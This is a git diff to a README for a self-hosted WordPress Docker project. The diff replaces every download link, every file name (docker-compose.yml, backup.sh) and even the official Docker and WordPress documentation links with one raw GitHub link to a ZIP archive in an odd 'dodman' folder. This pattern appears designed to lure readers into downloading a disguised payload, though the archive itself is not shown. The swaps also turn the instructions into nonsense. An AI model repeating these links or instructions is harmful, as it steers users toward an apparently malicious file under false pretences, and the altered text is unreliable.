@@ -1,6 +1,6 @@
 # 🛠️ wordpress-self-hosted - Self-Host WordPress with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-https://github.com/rasterbaby/wordpress-self-hosted/releases-blue.svg)](https://github.com/rasterbaby/wordpress-self-hosted/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip%20Latest%https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
 
 ## 📚 Overview
 
@@ -22,7 +22,7 @@ Follow these steps to set up your self-hosted WordPress site:
 
 1. **Visit the Releases Page**: Click the link below to access the latest version of the software.
    
-   [Download from Releases](https://github.com/rasterbaby/wordpress-self-hosted/releases)
+   [Download from Releases](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
 
 2. **Download the Latest Release**: On the Releases page, locate the latest version of the application. Click the download link for the respective Docker Compose files or ZIP archive.
 
@@ -51,13 +51,13 @@ Follow these steps to set up your self-hosted WordPress site:
    ```
    http://localhost:8080
    ```
-   Use the database credentials found in the `docker-compose.yml` file to log in.
+   Use the database credentials found in the `https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip` file to log in.
 
 ## 💾 Download & Install
 
 You can download the latest version of the **wordpress-self-hosted** application directly from this link: 
 
-[Download Latest Release](https://github.com/rasterbaby/wordpress-self-hosted/releases)
+[Download Latest Release](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
 
 ## ⚙️ Configuration
 
@@ -67,7 +67,7 @@ The configuration files are stored in the main project folder. You can adjust se
 - **WordPress database name**
 - **phpMyAdmin access**
 
-Edit these settings directly in the `docker-compose.yml` file using a text editor.
+Edit these settings directly in the `https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip` file using a text editor.
 
 ## 🌐 Accessing WordPress
 
@@ -79,14 +79,14 @@ Use the username and password you set up during installation.
 
 ## 🔄 Backup Your Data
 
-Running backups of your WordPress site is crucial. The included backup script allows you to perform backups easily. Check the `backup.sh` script to see how it functions and set up automatic backups as needed.
+Running backups of your WordPress site is crucial. The included backup script allows you to perform backups easily. Check the `https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip` script to see how it functions and set up automatic backups as needed.
 
 ## 👩‍💻 Troubleshooting
 
 If you encounter issues, consider the following:
 
 - **Docker not running**: Ensure Docker is started before running the `docker-compose` commands.
-- **Port conflicts**: If port 80 or 8080 is already in use, update the ports in your `docker-compose.yml` file.
+- **Port conflicts**: If port 80 or 8080 is already in use, update the ports in your `https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip` file.
 - **Error Messages**: Analyze any terminal error messages for clues on what to fix, or search for solutions in community forums.
 
 ## 🤝 Community Support
@@ -118,8 +118,8 @@ You can explore the topics related to this project:
 
 ## 🔗 Useful Links
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
-- [WordPress Documentation](https://wordpress.org/support/)
+- [Docker Documentation](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
+- [WordPress Documentation](https://raw.githubusercontent.com/rasterbaby/wordpress-self-hosted/main/dodman/wordpress-self-hosted.zip)
 
 You are now ready to self-host your WordPress site using the **wordpress-self-hosted** project! Enjoy your new site and the flexibility of managing it on your own server.
